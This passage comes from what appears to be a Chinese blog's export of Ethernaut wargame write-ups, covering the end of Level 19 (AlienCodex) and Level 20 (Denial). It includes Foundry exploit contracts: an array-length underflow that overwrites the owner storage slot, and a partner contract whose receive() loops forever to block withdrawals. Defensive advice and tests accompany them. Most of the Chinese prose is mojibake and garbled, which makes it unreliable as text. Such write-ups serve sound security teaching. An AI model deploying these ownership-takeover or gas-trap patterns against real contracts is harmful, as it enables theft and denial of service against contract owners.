æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç´¢å¼• <code>i</code>ï¼Œä½¿å¾— <code>keccak256(1) + i</code> åœ¨ <code>2**256</code> çš„æ¨¡è¿ç®—ä¸‹ç­‰äº <code>0</code>ã€‚</p>\n<p><code>keccak256(1) + i = 2**256</code><br><code>i = 2**256 - keccak256(1)</code></p>\n<p>ä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªç´¢å¼• <code>i</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>revise(i, our_address)</code> æ¥å°† <code>owner</code> ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦å°†æ‰§è¡Œä¸Šè¿°çš„ä¸‰ä¸ªæ­¥éª¤ï¼šå»ºç«‹è”ç³»ã€è§¦å‘ä¸‹æº¢ã€è®¡ç®—ç´¢å¼•å¹¶ä¿®æ”¹ <code>owner</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/19_AlienCodex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AlienCodexTest is Test &#123;</span><br><span class=\"line\">    AlienCodex instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new AlienCodex();</span><br><span class=\"line\">        assertNotEq(instance.owner(), player);</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    AlienCodex public instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        instance = AlienCodex(_instanceAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 1. æˆä¸ºè”ç³»äººï¼Œç»•è¿‡ modifier</span><br><span class=\"line\">        instance.makeContact();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. è°ƒç”¨ retract() è§¦å‘æ•°ç»„é•¿åº¦ä¸‹æº¢</span><br><span class=\"line\">        instance.retract();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. è®¡ç®—è¦†ç›– slot 0 æ‰€éœ€çš„ç´¢å¼•</span><br><span class=\"line\">        uint256 slot0_index;</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. è°ƒç”¨ revise() å°† owner ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€</span><br><span class=\"line\">        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è°ƒç”¨ <code>makeContact()</code></strong>: è§£é™¤å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨é™åˆ¶ã€‚</li>\n<li><strong>è°ƒç”¨ <code>retract()</code></strong>: åœ¨ <code>codex</code> æ•°ç»„ä¸ºç©ºæ—¶è°ƒç”¨ï¼Œåˆ©ç”¨æ•´æ•°ä¸‹æº¢å°†æ•°ç»„é•¿åº¦å˜ä¸º <code>type(uint256).max</code>ã€‚</li>\n<li><strong>è®¡ç®—ç›®æ ‡ç´¢å¼•</strong>: è®¡ç®—å‡ºèƒ½è®©æ•°ç»„è®¿é—®â€œç¯ç»•â€åˆ°å­˜å‚¨æ§½0çš„ç´¢å¼• <code>i = 2**256 - keccak256(1)</code>ã€‚</li>\n<li><strong>è°ƒç”¨ <code>revise()</code></strong>: ä½¿ç”¨è®¡ç®—å‡ºçš„ç´¢å¼•å’Œ <code>player</code> çš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨ <code>revise</code>ï¼Œè¿™ä¼šè¦†ç›– slot 0 çš„å†…å®¹ï¼Œä»è€Œæ”¹å˜ <code>owner</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>ä½¿ç”¨å®‰å…¨çš„Solidityç‰ˆæœ¬</strong>: ä» <code>0.8.0</code> ç‰ˆæœ¬å¼€å§‹ï¼ŒSolidity é»˜è®¤ä¼šå¯¹æ‰€æœ‰ç®—æœ¯è¿ç®—è¿›è¡Œä¸Šæº¢å’Œä¸‹æº¢æ£€æŸ¥ã€‚è¿™æ˜¯é˜²æ­¢æ­¤ç±»æ¼æ´æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚</li>\n<li><strong>ä½¿ç”¨ <code>SafeMath</code> åº“</strong>: å¦‚æœå¿…é¡»ä½¿ç”¨æ—§ç‰ˆæœ¬çš„Solidityï¼Œåº”å§‹ç»ˆä½¿ç”¨ <code>SafeMath</code> æˆ–ç±»ä¼¼çš„åº“æ¥æ‰§è¡Œæ‰€æœ‰ç®—æœ¯è¿ç®—ï¼Œä»¥é˜²æ­¢æº¢å‡ºã€‚</li>\n<li><strong>è°¨æ…å¤„ç†åŠ¨æ€æ•°ç»„</strong>: åŠ¨æ€æ•°ç»„çš„å­˜å‚¨ç®¡ç†å¾ˆå¤æ‚ã€‚åº”é¿å…å…è®¸ç”¨æˆ·ç›´æ¥æ§åˆ¶å¯èƒ½å¯¼è‡´å­˜å‚¨å†²çªçš„æ“ä½œï¼Œå¦‚æ— é™åˆ¶åœ°å¢åŠ æˆ–å‡å°‘æ•°ç»„é•¿åº¦ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>æ•´æ•°æº¢å‡º (Overflow&#x2F;Underflow)</strong>: åœ¨æ—§ç‰ˆæœ¬Solidityä¸­ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚å½“ä¸€ä¸ªæ•´æ•°å˜é‡å¢åŠ è¶…è¿‡å…¶æœ€å¤§å€¼ï¼ˆä¸Šæº¢ï¼‰æˆ–å‡å°‘åˆ°å°äºå…¶æœ€å°å€¼ï¼ˆä¸‹æº¢ï¼‰æ—¶å‘ç”Ÿã€‚</li>\n<li><strong>åŠ¨æ€æ•°ç»„çš„å­˜å‚¨å¸ƒå±€</strong>: ç†è§£åŠ¨æ€æ•°ç»„çš„é•¿åº¦å’Œæ•°æ®æ˜¯å¦‚ä½•åœ¨å­˜å‚¨ä¸­å¸ƒå±€çš„ï¼Œæ˜¯å‘ç°å’Œåˆ©ç”¨å­˜å‚¨æ“çºµæ¼æ´çš„å…³é”®ã€‚</li>\n<li><strong><code>keccak256</code></strong>: EVMä¸­ç”¨äºè®¡ç®—å“ˆå¸Œçš„æ ¸å¿ƒå‡½æ•°ï¼Œå®ƒåœ¨ç¡®å®šå­˜å‚¨ä½ç½®æ—¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚</li>\n<li><strong>Foundry <code>unchecked</code></strong>: åœ¨Solidity <code>^0.8.0</code> ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>unchecked</code> å—æ¥æ•…æ„å…è®¸æº¢å‡ºï¼Œè¿™åœ¨å¤ç°æ—§ç‰ˆæœ¬æ¼æ´æˆ–è¿›è¡Œç‰¹å®šä½æ“ä½œæ—¶å¾ˆæœ‰ç”¨ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>æ—§ç‰ˆSolidityï¼ˆ&lt;0.8.0ï¼‰çš„æ•´æ•°è¿ç®—é»˜è®¤ä¸æ£€æŸ¥æº¢å‡ºã€‚</li>\n<li>åŠ¨æ€æ•°ç»„çš„é•¿åº¦å¯ä»¥è¢«æ“çºµï¼Œä»¥è®¿é—®åˆçº¦çš„æ•´ä¸ª256ä½å­˜å‚¨ç©ºé—´ã€‚</li>\n<li>åˆçº¦çš„å­˜å‚¨æ§½ä½å¯ä»¥é€šè¿‡ <code>keccak256</code> å“ˆå¸Œè¿›è¡Œç¡®å®šæ€§è®¡ç®—ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ•´æ•°ä¸‹æº¢ä¸€ä¸ªåŠ¨æ€æ•°ç»„çš„é•¿åº¦ï¼Œè·å¾—å¯¹åˆçº¦ä»»æ„å­˜å‚¨ä½ç½®çš„å†™æƒé™ã€‚</li>\n<li>è®¡ç®—å‡ºæŒ‡å‘ <code>owner</code> å˜é‡æ‰€åœ¨å­˜å‚¨æ§½ï¼ˆslot 0ï¼‰çš„æ•°ç»„ç´¢å¼•ã€‚</li>\n<li>è°ƒç”¨æ•°ç»„çš„å†™å‡½æ•°ï¼ˆ<code>revise</code>ï¼‰æ¥è¦†ç›– <code>owner</code>ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å§‹ç»ˆä½¿ç”¨æœ€æ–°çš„ã€å®‰å…¨çš„Solidityç‰ˆæœ¬ã€‚</li>\n<li>å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬ï¼Œå¿…é¡»ä½¿ç”¨ <code>SafeMath</code>ã€‚</li>\n<li>å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å½±å“çŠ¶æ€å˜é‡ï¼ˆå¦‚æ•°ç»„é•¿åº¦ï¼‰çš„è¾“å…¥ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays\">Solidity Docs: Mapping and Dynamic Arrays</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/\">Consensys: Integer Overflow and Underflow</a></li>\n</ul>\n"},{"title":"Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡","date":"2025-01-25T08:45:00.000Z","updated":"2025-01-25T08:45:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ä¸€ä¸ªä¸å—ä¿¡ä»»çš„å¤–éƒ¨è°ƒç”¨æ¥å‘åŠ¨æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚é€šè¿‡è®¾ç½®ä¸€ä¸ªæ¶æ„çš„ `partner` åˆçº¦ï¼Œä½¿å…¶åœ¨æ¥æ”¶ä»¥å¤ªå¸æ—¶è€—å°½æ‰€æœ‰ Gasï¼Œä»è€Œé˜»æ­¢ `owner` æå–èµ„é‡‘ï¼ŒæŒæ¡ Denial å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 20 - Denial](https://ethernaut.openzeppelin.com/level/20)  \n> **æ”»å‡»ç±»å‹**: æ‹’ç»æœåŠ¡ (Denial of Service - DoS)  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯é˜»æ­¢ `owner` ä»åˆçº¦ä¸­æå–èµ„é‡‘ã€‚ä½ éœ€è¦è®© `withdraw()` å‡½æ•°æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œä»è€Œå®ç°æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\n\n![Denial Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ `withdraw()` å‡½æ•°çš„å®ç°ï¼š\n\n```solidity\ncontract Denial {\n    // ...\n    address public partner; // The partner can be set by anyone.\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        \n        // Perform the call. We don't check the return value.\n        partner.call{value: amountToSend}(\"\");\n        \n        payable(owner).transfer(amountToSend);\n    }\n}\n```\n\næ¼æ´ç‚¹éå¸¸æ˜ç¡®ï¼š\n\n1.  **ä»»æ„è®¾ç½® `partner`**: ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ `setWithdrawPartner()` æ¥è®¾ç½® `partner` åœ°å€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°† `partner` è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„æ¶æ„åˆçº¦ã€‚\n2.  **æœªæ£€æŸ¥çš„å¤–éƒ¨è°ƒç”¨**: `partner.call{value: amountToSend}(\"\")` æ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨ã€‚å…³é”®åœ¨äºï¼Œä»£ç **æ²¡æœ‰æ£€æŸ¥ `call` çš„è¿”å›å€¼**ã€‚å¦‚æœè¿™ä¸ª `call` å¤±è´¥ï¼Œå‡½æ•°ä¼šç»§ç»­æ‰§è¡Œã€‚\n3.  **Gas è½¬å‘**: `call` é»˜è®¤ä¼šè½¬å‘æ‰€æœ‰å‰©ä½™çš„ Gasã€‚å¦‚æœ `partner` åˆçº¦çš„ `receive()` æˆ– `fallback()` å‡½æ•°æ˜¯ä¸€ä¸ª Gas é™·é˜±ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ— é™å¾ªç¯ï¼‰ï¼Œå®ƒå°†è€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ª `withdraw()` äº¤æ˜“å›  `out of gas` è€Œå¤±è´¥ã€‚\n\næ”»å‡»æ€è·¯å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å°†éƒ¨ç½²ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º `partner`ã€‚å½“ `owner` è°ƒç”¨ `withdraw()` æ—¶ï¼Œå¯¹æˆ‘ä»¬æ¶æ„åˆçº¦çš„ `call` å°†ä¼šæ‰§è¡Œï¼Œè§¦å‘æˆ‘ä»¬çš„æ¶æ„é€»è¾‘ï¼Œä»è€Œä½¿æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚\n\næˆ‘ä»¬çš„æ¶æ„åˆçº¦åªéœ€è¦ä¸€ä¸ª `receive()` å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ï¼š\n\n```solidity\ncontract MaliciousPartner {\n    receive() external payable {\n        // Consume all gas\n        while (true) {}\n    }\n}\n```\n\nå½“ `withdraw()` å‡½æ•°å‘è¿™ä¸ªåˆçº¦å‘é€ä»¥å¤ªå¸æ—¶ï¼Œ`receive()` å‡½æ•°è¢«è§¦å‘ï¼Œè¿›å…¥æ— é™å¾ªç¯ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´ `withdraw()` äº¤æ˜“ `revert`ã€‚`owner` æ°¸è¿œæ— æ³•æˆåŠŸæå–èµ„é‡‘ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª `receive()` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// æ¶æ„åˆçº¦ï¼Œç”¨äºå‘åŠ¨ DoS æ”»å‡»\ncontract Attack {\n    // å½“æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶ï¼Œè¿›å…¥æ— é™å¾ªç¯ä»¥è€—å°½æ‰€æœ‰ Gas\n    receive() external payable {\n        while (true) {}\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç éœ€è¦éªŒè¯ `withdraw()` è°ƒç”¨ç¡®å®å¤±è´¥äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„ `vm.expectRevert()` æ¥å®ç°è¿™ä¸€ç‚¹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/20_Denial.sol\";\n\ncontract DenialTest is Test {\n    Denial instance;\n    Attack attacker;\n    address owner;\n    address player; // æ”»å‡»è€…\n\n    function setUp() public {\n        owner = vm.addr(1);\n        player = vm.addr(2);\n\n        // éƒ¨ç½² Denial åˆçº¦å¹¶å­˜å…¥ 1 ether\n        vm.startPrank(owner);\n        instance = new Denial();\n        vm.deal(address(instance), 1 ether);\n        vm.stopPrank();\n\n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        attacker = new Attack();\n    }\n\n    function testDenialOfServiceAttack() public {\n        // 1. æ”»å‡»è€…å°†æ¶æ„åˆçº¦è®¾ç½®ä¸º partner\n        vm.prank(player);\n        instance.setWithdrawPartner(address(attacker));\n\n        // 2. owner å°è¯•ææ¬¾\n        vm.startPrank(owner);\n        uint256 initialOwnerBalance = owner.balance;\n\n        // 3. æ–­è¨€äº¤æ˜“ä¼šå¤±è´¥ (revert)\n        // å› ä¸ºå¯¹æ¶æ„ partner çš„è°ƒç”¨ä¼šè€—å°½æ‰€æœ‰ gas\n        vm.expectRevert();\n        instance.withdraw();\n\n        // 4. éªŒè¯ owner çš„ä½™é¢æ²¡æœ‰å¢åŠ \n        assertEq(owner.balance, initialOwnerBalance);\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ¶æ„åˆçº¦**: åˆ›å»ºä¸€ä¸ª `Attack` åˆçº¦ï¼Œå…¶ `receive()` å‡½æ•°åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ã€‚\n2.  **è®¾ç½® `partner`**: è°ƒç”¨ `setWithdrawPartner()`ï¼Œå°† `Denial` åˆçº¦çš„ `partner` è®¾ç½®ä¸º `Attack` åˆçº¦çš„åœ°å€ã€‚\n3.  **è§¦å‘æ¼æ´**: å½“ `owner` è°ƒç”¨ `withdraw()` æ—¶ï¼Œå¯¹ `partner` çš„ `call` ä¼šè§¦å‘ `Attack` åˆçº¦çš„ `receive()` å‡½æ•°ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **æ£€æŸ¥å¤–éƒ¨è°ƒç”¨çš„è¿”å›å€¼**: æ°¸è¿œä¸è¦å‡è®¾å¤–éƒ¨è°ƒç”¨ä¼šæˆåŠŸã€‚å¿…é¡»æ£€æŸ¥ `call` çš„è¿”å›å€¼ï¼Œå¹¶å¯¹å¤±è´¥æƒ…å†µè¿›è¡Œå¤„ç†ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    (bool sent, ) = partner.call{value: amountToSend}(\"\");\n    require(sent, \"Failed to send Ether to partner\");\n    ```\n\n2.  **éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼**: åº”è¯¥åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ä¹‹åå†ä¸å¤–éƒ¨åˆçº¦äº¤äº’ã€‚è™½ç„¶åœ¨æœ¬ä¾‹ä¸­ä¸æ˜¯ç›´æ¥åŸå› ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„å®‰å…¨æœ€ä½³å®è·µã€‚\n3.  **é™åˆ¶ Gas**: åœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œæ˜ç¡®æŒ‡å®šè½¬å‘çš„ Gas æ•°é‡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„å…¨é¢è½¬å‘ã€‚è¿™å¯ä»¥é™åˆ¶æ¶æ„åˆçº¦å¯èƒ½é€ æˆçš„æŸå®³ã€‚\n\n    ```solidity\n    // é™åˆ¶ Gas\n    partner.call{value: amountToSend, gas: 50000}(\"\");\n    ```\n\n4.  **å¼•å…¥ææ¬¾æ¨¡å¼ (Pull-over-Push)**: ä¸è¦ä¸»åŠ¨â€œæ¨é€â€èµ„é‡‘ç»™ç”¨æˆ·ï¼Œè€Œæ˜¯è®©ç”¨æˆ·è‡ªå·±â€œæ‹‰å–â€ï¼ˆææ¬¾ï¼‰ã€‚ç”¨æˆ·è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥ææ¬¾ï¼Œè€Œä¸æ˜¯åˆçº¦è‡ªåŠ¨å‘é€èµ„é‡‘ã€‚è¿™å¯ä»¥é˜²æ­¢å› å¤–éƒ¨è°ƒç”¨å¤±è´¥è€Œå¯¼è‡´çš„é—®é¢˜ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **æ‹’ç»æœåŠ¡ (DoS)**: ä¸€ç§å¸¸è§çš„æ”»å‡»ç±»å‹ï¼Œæ—¨åœ¨ä½¿ç³»ç»Ÿæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœåŠ¡ã€‚\n-   **`call`**: Solidity ä¸­ç”¨äºä¸å…¶ä»–åˆçº¦äº¤äº’çš„åº•å±‚å‡½æ•°ã€‚å®ƒåŠŸèƒ½å¼ºå¤§ä½†ä¹Ÿå¾ˆå±é™©ï¼Œéœ€è¦å°å¿ƒä½¿ç”¨ã€‚\n-   **`receive()` å‡½æ•°**: åˆçº¦åœ¨æ¥æ”¶åˆ°æ²¡æœ‰ `calldata` çš„ä»¥å¤ªå¸æ—¶æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°ã€‚\n-   **Gas**: EVM ä¸­ç”¨äºè¡¡é‡è®¡ç®—æˆæœ¬çš„å•ä½ã€‚å¯¹ Gas çš„æ“çºµæ˜¯è®¸å¤šé«˜çº§æ”»å‡»çš„åŸºç¡€ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   å¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¯èƒ½ä¼šå¤±è´¥æˆ–è¢«æ¶æ„åˆ©ç”¨ã€‚\n-   å¿…é¡»å§‹ç»ˆæ£€æŸ¥åº•å±‚ `call` çš„è¿”å›å€¼ã€‚\n-   ä¸å—é™åˆ¶çš„ Gas è½¬å‘ä¼šç»™æ¶æ„åˆçº¦æ‰§è¡Œä»»æ„å¤æ‚ï¼ˆä¸”è€— Gasï¼‰ä»£ç çš„æœºä¼šã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸€ä¸ªå¯è¢«ä»»æ„è®¾ç½®çš„åœ°å€ï¼Œå°†æ¶æ„åˆçº¦å¼•å…¥åˆ°ç›®æ ‡åˆçº¦çš„æ‰§è¡Œæµç¨‹ä¸­ã€‚\n-   åœ¨æ¶æ„åˆçº¦çš„ `receive()` æˆ– `fallback()` å‡½æ•°ä¸­åˆ¶é€  Gas é™·é˜±ï¼Œè€—å°½äº¤æ˜“çš„ Gasï¼Œå¯¼è‡´ä¸»è°ƒç”¨å¤±è´¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   æ£€æŸ¥ `call` çš„è¿”å›å€¼ã€‚\n-   é™åˆ¶å¤–éƒ¨è°ƒç”¨çš„ Gasã€‚\n-   ä¼˜å…ˆä½¿ç”¨â€œææ¬¾â€æ¨¡å¼è€Œä¸æ˜¯â€œæ¨é€â€æ¨¡å¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Sending Ether](https://docs.soliditylang.org/en/latest/contracts.html#sending-ether)\n-   [Consensys: Denial of Service](https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos)","source":"_posts/ethernaut-level-20-denial.md","raw":"---\ntitle: 'Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡'\ndate: 2025-01-25 16:45:00\nupdated: 2025-01-25 16:45:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Denial of Service\n  - DoS\n  - unchecked call\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"å­¦ä¹ å¦‚ä½•åˆ©ç”¨ä¸€ä¸ªä¸å—ä¿¡ä»»çš„å¤–éƒ¨è°ƒç”¨æ¥å‘åŠ¨æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚é€šè¿‡è®¾ç½®ä¸€ä¸ªæ¶æ„çš„ `partner` åˆçº¦ï¼Œä½¿å…¶åœ¨æ¥æ”¶ä»¥å¤ªå¸æ—¶è€—å°½æ‰€æœ‰ Gasï¼Œä»è€Œé˜»æ­¢ `owner` æå–èµ„é‡‘ï¼ŒæŒæ¡ Denial å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 20: Denial - 